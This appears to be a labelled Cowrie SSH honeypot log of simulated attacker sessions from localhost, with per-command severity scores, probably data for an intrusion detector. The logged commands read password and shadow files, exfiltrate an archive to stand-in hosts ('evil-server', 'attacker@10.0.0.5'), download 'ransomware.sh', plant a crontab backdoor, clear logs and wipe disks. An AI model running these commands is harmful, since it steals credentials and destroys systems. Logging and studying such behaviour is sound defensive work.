+2026-05-17T18:53:10.977173Z,cowrie.command.failed,127.0.0.1,640beb65f218,,,root/toor ,Command not found: root/toor ,ssh,0,0,0,0,0,10,1,Normal
+2026-05-17T18:53:21.898858Z,cowrie.command.input,127.0.0.1,640beb65f218,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T18:53:21.905799Z,cowrie.command.input,127.0.0.1,640beb65f218,,,uname -a,CMD: uname -a,ssh,1,0,0,0,0,8,0,Low
+2026-05-17T18:53:21.907802Z,cowrie.command.input,127.0.0.1,640beb65f218,,,hostname,CMD: hostname,ssh,1,0,0,0,0,8,0,Low
+2026-05-17T18:53:21.911025Z,cowrie.command.input,127.0.0.1,640beb65f218,,,id,CMD: id,ssh,1,0,0,0,0,2,0,Low
+2026-05-17T18:53:21.914970Z,cowrie.command.input,127.0.0.1,640beb65f218,,,pwd,CMD: pwd,ssh,1,0,0,0,0,3,0,Low
+2026-05-17T18:53:21.917202Z,cowrie.command.input,127.0.0.1,640beb65f218,,,ls -la,CMD: ls -la,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T18:53:21.925840Z,cowrie.command.input,127.0.0.1,640beb65f218,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
+2026-05-17T18:53:21.928672Z,cowrie.command.input,127.0.0.1,640beb65f218,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
+2026-05-17T18:53:21.931083Z,cowrie.command.input,127.0.0.1,640beb65f218,,,ps aux,CMD: ps aux,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T18:53:21.936566Z,cowrie.command.input,127.0.0.1,640beb65f218,,,netstat -tulnp,CMD: netstat -tulnp,ssh,1,0,0,0,0,14,0,Low
+2026-05-17T18:53:21.937960Z,cowrie.command.input,127.0.0.1,640beb65f218,,,history,CMD: history,ssh,0,0,0,0,0,7,0,Normal
+2026-05-17T18:53:22.501249Z,cowrie.command.input,127.0.0.1,640beb65f218,,,env,CMD: env,ssh,0,0,0,0,0,3,0,Normal
+2026-05-17T18:53:30.718460Z,cowrie.command.input,127.0.0.1,640beb65f218,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:53:30.719848Z,cowrie.log.closed,127.0.0.1,640beb65f218,,,,Closing TTY Log: var/lib/cowrie/tty/9c9df364ec47a251f34086e2bae8cadd725c8f52f989b338937490be2c1d461e after 29.0 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:30.721567Z,cowrie.session.closed,127.0.0.1,640beb65f218,,,,Connection lost after 34.7 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:32.245742Z,cowrie.session.connect,127.0.0.1,116c7a3249b1,,,,New connection: 127.0.0.1:50170 (127.0.0.1:2222) [session: 116c7a3249b1],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:32.248431Z,cowrie.client.version,127.0.0.1,116c7a3249b1,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:32.249770Z,cowrie.client.kex,127.0.0.1,116c7a3249b1,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:41.706937Z,cowrie.login.success,127.0.0.1,116c7a3249b1,root,wesdtgyhuj,,login attempt [root/wesdtgyhuj] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:41.743972Z,cowrie.client.size,127.0.0.1,116c7a3249b1,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:41.744419Z,cowrie.client.var,127.0.0.1,116c7a3249b1,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:41.744774Z,cowrie.client.var,127.0.0.1,116c7a3249b1,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:41.745535Z,cowrie.session.params,127.0.0.1,116c7a3249b1,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:47.430377Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,sudo su,CMD: sudo su,ssh,0,0,1,0,0,7,0,High
+2026-05-17T18:53:47.432057Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,sudo -l,CMD: sudo -l,ssh,0,0,1,0,0,7,0,High
+2026-05-17T18:53:47.438734Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,find / -perm -4000 2>/dev/null,CMD: find / -perm -4000 2>/dev/null,ssh,0,0,0,0,0,30,0,Normal
+2026-05-17T18:53:48.722098Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,chmod 777 /etc/passwd,CMD: chmod 777 /etc/passwd,ssh,0,1,1,0,0,21,0,High
+2026-05-17T18:53:55.804122Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:53:55.807598Z,cowrie.log.closed,127.0.0.1,116c7a3249b1,,,,Closing TTY Log: var/lib/cowrie/tty/65168bf632943fe657a99a519d90ccf98d8aea6681934ec57c697fc3f167ce38 after 14.1 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:53:55.812687Z,cowrie.session.closed,127.0.0.1,116c7a3249b1,,,,Connection lost after 23.6 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:10.263162Z,cowrie.session.connect,127.0.0.1,7a4f962adbaa,,,,New connection: 127.0.0.1:36364 (127.0.0.1:2222) [session: 7a4f962adbaa],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:10.268964Z,cowrie.client.version,127.0.0.1,7a4f962adbaa,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:10.271768Z,cowrie.client.kex,127.0.0.1,7a4f962adbaa,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:17.842019Z,cowrie.login.success,127.0.0.1,7a4f962adbaa,root,cat /etc/shadow,,login attempt [root/cat /etc/shadow] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:17.879042Z,cowrie.client.size,127.0.0.1,7a4f962adbaa,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:17.880081Z,cowrie.client.var,127.0.0.1,7a4f962adbaa,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:17.880799Z,cowrie.client.var,127.0.0.1,7a4f962adbaa,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:17.882078Z,cowrie.session.params,127.0.0.1,7a4f962adbaa,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:28.654761Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
+2026-05-17T18:54:28.660852Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,grep password database.sql,CMD: grep password database.sql,ssh,0,0,0,0,0,26,0,Normal
+2026-05-17T18:54:29.775246Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,cat ~/.bash_history,CMD: cat ~/.bash_history,ssh,0,0,0,0,0,19,0,Normal
+2026-05-17T18:54:42.549378Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:54:42.552428Z,cowrie.log.closed,127.0.0.1,7a4f962adbaa,,,,Closing TTY Log: var/lib/cowrie/tty/5b6f5e5df1e3b2c397a1075b844906cb09ec7f7b776ace72f0bc583cc1ed91a6 after 24.7 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:42.557347Z,cowrie.session.closed,127.0.0.1,7a4f962adbaa,,,,Connection lost after 32.3 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:44.439942Z,cowrie.session.connect,127.0.0.1,1016dece0ea6,,,,New connection: 127.0.0.1:56896 (127.0.0.1:2222) [session: 1016dece0ea6],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:44.443734Z,cowrie.client.version,127.0.0.1,1016dece0ea6,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:44.450393Z,cowrie.client.kex,127.0.0.1,1016dece0ea6,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:51.088005Z,cowrie.login.success,127.0.0.1,1016dece0ea6,root,ygvcnbkjlki,,login attempt [root/ygvcnbkjlki] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:51.136340Z,cowrie.client.size,127.0.0.1,1016dece0ea6,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:51.139155Z,cowrie.client.var,127.0.0.1,1016dece0ea6,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:51.140716Z,cowrie.client.var,127.0.0.1,1016dece0ea6,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:54:51.154458Z,cowrie.session.params,127.0.0.1,1016dece0ea6,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:29.555993Z,cowrie.command.input,127.0.0.1,1016dece0ea6,,,tar -czf loot.tar.gz /etc/,CMD: tar -czf loot.tar.gz /etc/,ssh,0,0,0,0,0,26,0,Normal
+2026-05-17T18:55:29.562843Z,cowrie.command.input,127.0.0.1,1016dece0ea6,,,scp loot.tar.gz attacker@10.0.0.5:/tmp,CMD: scp loot.tar.gz attacker@10.0.0.5:/tmp,ssh,0,0,0,0,0,38,0,Normal
+2026-05-17T18:55:33.496441Z,cowrie.session.file_download,127.0.0.1,1016dece0ea6,,,curl -x post http://evil-server/upload -f file=@loot.tar.gz,INPUT (scp): curl -X POST http://evil-server/upload -F file=@loot.tar.gz,ssh,0,1,0,0,0,59,0,Medium
+2026-05-17T18:55:33.561783Z,cowrie.log.closed,127.0.0.1,1016dece0ea6,,,,Closing TTY Log: var/lib/cowrie/tty/50c52b14ea528bfc6a429a70f3b9413d658edc87c6123c20f2ef7c88c22edc5b after 42.4 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:33.565116Z,cowrie.session.closed,127.0.0.1,1016dece0ea6,,,,Connection lost after 49.1 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:49.562184Z,cowrie.session.connect,127.0.0.1,d1947e624fc8,,,,New connection: 127.0.0.1:44136 (127.0.0.1:2222) [session: d1947e624fc8],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:49.563523Z,cowrie.client.version,127.0.0.1,d1947e624fc8,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:49.565831Z,cowrie.client.kex,127.0.0.1,d1947e624fc8,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:55.176013Z,cowrie.login.success,127.0.0.1,d1947e624fc8,root,u82sed67,,login attempt [root/u82sed67] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:55.240225Z,cowrie.client.size,127.0.0.1,d1947e624fc8,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:55.242826Z,cowrie.client.var,127.0.0.1,d1947e624fc8,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:55.243761Z,cowrie.client.var,127.0.0.1,d1947e624fc8,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:55:55.245136Z,cowrie.session.params,127.0.0.1,d1947e624fc8,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:01.839877Z,cowrie.command.input,127.0.0.1,d1947e624fc8,,,wget http://malicious.com/ransomware.sh,CMD: wget http://malicious.com/ransomware.sh,ssh,0,1,0,0,0,39,0,Medium
+2026-05-17T18:56:04.003334Z,cowrie.session.file_download,127.0.0.1,d1947e624fc8,,,,Downloaded URL (http://malicious.com/ransomware.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:04.703001Z,cowrie.session.file_download,127.0.0.1,d1947e624fc8,,,,Downloaded URL (http://evil.com/botnet.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:20.254211Z,cowrie.command.input,127.0.0.1,d1947e624fc8,,,./ransomware.shexit,CMD: ./ransomware.shexit,ssh,0,1,0,0,0,19,0,Medium
+2026-05-17T18:56:20.257414Z,cowrie.command.failed,127.0.0.1,d1947e624fc8,,,./ransomware.shexit ,Command not found: ./ransomware.shexit ,ssh,0,1,0,0,0,20,1,Medium
+2026-05-17T18:56:22.396785Z,cowrie.command.input,127.0.0.1,d1947e624fc8,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:56:22.398630Z,cowrie.log.closed,127.0.0.1,d1947e624fc8,,,,Closing TTY Log: var/lib/cowrie/tty/25c5a404bf67c67c8abe7183b4497d48d6f99987258f4f65c13a6df956c2edc3 after 27.2 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:22.401306Z,cowrie.session.closed,127.0.0.1,d1947e624fc8,,,,Connection lost after 32.8 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:24.153217Z,cowrie.session.connect,127.0.0.1,ee2b60898e62,,,,New connection: 127.0.0.1:42630 (127.0.0.1:2222) [session: ee2b60898e62],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:24.154338Z,cowrie.client.version,127.0.0.1,ee2b60898e62,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:24.156013Z,cowrie.client.kex,127.0.0.1,ee2b60898e62,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:31.588451Z,cowrie.login.success,127.0.0.1,ee2b60898e62,root,history -c,,login attempt [root/history -c] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:31.891680Z,cowrie.client.size,127.0.0.1,ee2b60898e62,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:31.893016Z,cowrie.client.var,127.0.0.1,ee2b60898e62,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:31.893658Z,cowrie.client.var,127.0.0.1,ee2b60898e62,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:31.894630Z,cowrie.session.params,127.0.0.1,ee2b60898e62,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:38.804786Z,cowrie.command.input,127.0.0.1,ee2b60898e62,,,history -c,CMD: history -c,ssh,0,0,0,0,0,10,0,Normal
+2026-05-17T18:56:39.259086Z,cowrie.command.input,127.0.0.1,ee2b60898e62,,,rm -rf /var/log/*,CMD: rm -rf /var/log/*,ssh,0,0,0,1,0,17,0,Critical
+2026-05-17T18:56:51.023893Z,cowrie.command.input,127.0.0.1,ee2b60898e62,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T18:56:51.025598Z,cowrie.log.closed,127.0.0.1,ee2b60898e62,,,,Closing TTY Log: var/lib/cowrie/tty/5cd4f52b4caa6992a18f64d9b5a7e895e6a9bd58d739c54229a8fc37b81f31d1 after 19.1 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:51.027772Z,cowrie.session.closed,127.0.0.1,ee2b60898e62,,,,Connection lost after 26.9 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:56.063416Z,cowrie.session.connect,127.0.0.1,e6e1dd3bfe43,,,,New connection: 127.0.0.1:34162 (127.0.0.1:2222) [session: e6e1dd3bfe43],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:56.065874Z,cowrie.client.version,127.0.0.1,e6e1dd3bfe43,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:56:56.067428Z,cowrie.client.kex,127.0.0.1,e6e1dd3bfe43,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:01.959414Z,cowrie.login.success,127.0.0.1,e6e1dd3bfe43,root,wsedplovbhyOM,,login attempt [root/wsedplovbhyOM] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:02.000754Z,cowrie.client.size,127.0.0.1,e6e1dd3bfe43,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:02.002259Z,cowrie.client.var,127.0.0.1,e6e1dd3bfe43,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:02.003185Z,cowrie.client.var,127.0.0.1,e6e1dd3bfe43,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:02.018716Z,cowrie.session.params,127.0.0.1,e6e1dd3bfe43,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:08.351992Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,ssh admin@192.168.1.10,CMD: ssh admin@192.168.1.10,ssh,0,0,0,0,0,22,0,Normal
+2026-05-17T18:57:48.115873Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,,CMD: ,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:48.122516Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~#  ,CMD: root@localhost:~#  ,ssh,0,0,0,0,0,19,0,Normal
+2026-05-17T18:57:48.123690Z,cowrie.command.failed,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~ ,Command not found: root@localhost:~ ,ssh,0,0,0,0,0,17,1,Normal
+2026-05-17T18:57:53.241249Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,,CMD: ,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:57:53.244024Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~#  ,CMD: root@localhost:~#  ,ssh,0,0,0,0,0,19,0,Normal
+2026-05-17T18:57:53.260367Z,cowrie.command.failed,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~ ,Command not found: root@localhost:~ ,ssh,0,0,0,0,0,17,1,Normal
+2026-05-17T18:58:03.345841Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,scp payload.sh user@192.168.1.15:/tmp,CMD: scp payload.sh user@192.168.1.15:/tmp,ssh,0,0,0,0,0,37,0,Normal
+2026-05-17T18:59:41.157603Z,cowrie.session.file_download,127.0.0.1,e6e1dd3bfe43,,,,INPUT (scp): ,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:41.219500Z,cowrie.log.closed,127.0.0.1,e6e1dd3bfe43,,,,Closing TTY Log: var/lib/cowrie/tty/8d7b169c5df9bab1aa8b7101d35856c50644aa804a97e0aad4fbc9550289dd29 after 159.2 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:41.226277Z,cowrie.session.closed,127.0.0.1,e6e1dd3bfe43,,,,Connection lost after 165.2 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:49.376545Z,cowrie.session.connect,127.0.0.1,5adf874f3eda,,,,New connection: 127.0.0.1:58940 (127.0.0.1:2222) [session: 5adf874f3eda],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:49.379433Z,cowrie.client.version,127.0.0.1,5adf874f3eda,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:49.389977Z,cowrie.client.kex,127.0.0.1,5adf874f3eda,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:52.526530Z,cowrie.login.success,127.0.0.1,5adf874f3eda,root,iuyht,,login attempt [root/iuyht] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:52.610007Z,cowrie.client.size,127.0.0.1,5adf874f3eda,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:52.611021Z,cowrie.client.var,127.0.0.1,5adf874f3eda,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:52.611537Z,cowrie.client.var,127.0.0.1,5adf874f3eda,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T18:59:52.614444Z,cowrie.session.params,127.0.0.1,5adf874f3eda,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:00:00.924480Z,cowrie.command.input,127.0.0.1,5adf874f3eda,,,rm -rf /,CMD: rm -rf /,ssh,0,0,0,1,0,8,0,Critical
+2026-05-17T19:00:02.618526Z,cowrie.command.input,127.0.0.1,5adf874f3eda,,,dd if=/dev/zero of=/dev/sda,CMD: dd if=/dev/zero of=/dev/sda,ssh,0,0,0,1,0,27,0,Critical
+2026-05-17T19:01:00.102189Z,cowrie.command.input,127.0.0.1,5adf874f3eda,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T19:01:00.138052Z,cowrie.log.closed,127.0.0.1,5adf874f3eda,,,,Closing TTY Log: var/lib/cowrie/tty/3c134a288a2767dea02b65b2807eb98781c2b70bf121a8bb8bad9cc8728bdf6d after 67.5 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:01:00.156078Z,cowrie.session.closed,127.0.0.1,5adf874f3eda,,,,Connection lost after 70.8 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:06.545697Z,cowrie.session.connect,127.0.0.1,ec674b411fce,,,,New connection: 127.0.0.1:58408 (127.0.0.1:2222) [session: ec674b411fce],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:06.556118Z,cowrie.client.version,127.0.0.1,ec674b411fce,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:06.570301Z,cowrie.client.kex,127.0.0.1,ec674b411fce,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:12.236741Z,cowrie.login.success,127.0.0.1,ec674b411fce,root,b5c8n0ko99,,login attempt [root/b5c8n0ko99] succeeded,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:12.519059Z,cowrie.client.size,127.0.0.1,ec674b411fce,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:12.522156Z,cowrie.client.var,127.0.0.1,ec674b411fce,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:12.524916Z,cowrie.client.var,127.0.0.1,ec674b411fce,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:12.540891Z,cowrie.session.params,127.0.0.1,ec674b411fce,,,,[],ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:02:17.803429Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
+2026-05-17T19:02:18.871974Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
+2026-05-17T19:02:42.118665Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,"echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab","CMD: echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab",ssh,0,0,0,0,1,49,0,High
+2026-05-17T19:02:48.782614Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,rm -rf /,CMD: rm -rf /,ssh,0,0,0,1,0,8,0,Critical
+2026-05-17T19:02:49.592403Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,dd if=/dev/zero of=/dev/sda,CMD: dd if=/dev/zero of=/dev/sda,ssh,0,0,0,1,0,27,0,Critical
+2026-05-17T19:02:59.947677Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,wget malware.sh,CMD: wget malware.sh,ssh,0,1,0,0,0,15,0,Medium
+2026-05-17T19:03:07.196562Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,./malware.shls,CMD: ./malware.shls,ssh,1,1,0,0,0,14,0,Medium
+2026-05-17T19:03:07.198397Z,cowrie.command.failed,127.0.0.1,ec674b411fce,,,./malware.shls ,Command not found: ./malware.shls ,ssh,1,1,0,0,0,15,1,Medium
+2026-05-17T19:03:07.200462Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,pwd,CMD: pwd,ssh,1,0,0,0,0,3,0,Low
+2026-05-17T19:03:07.667711Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
+2026-05-17T19:03:20.959594Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
+2026-05-17T19:03:20.993738Z,cowrie.session.file_download,127.0.0.1,ec674b411fce,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:03:20.997656Z,cowrie.log.closed,127.0.0.1,ec674b411fce,,,,Closing TTY Log: var/lib/cowrie/tty/ec752396bc81d112cc99c23b220fe9d484b3a2618aea3e36c18423d0f0045698 after 68.5 seconds,ssh,0,0,0,0,0,0,0,Normal
+2026-05-17T19:03:21.005383Z,cowrie.session.closed,127.0.0.1,ec674b411fce,,,,Connection lost after 74.5 seconds,ssh,0,0,0,0,0,0,0,Normal
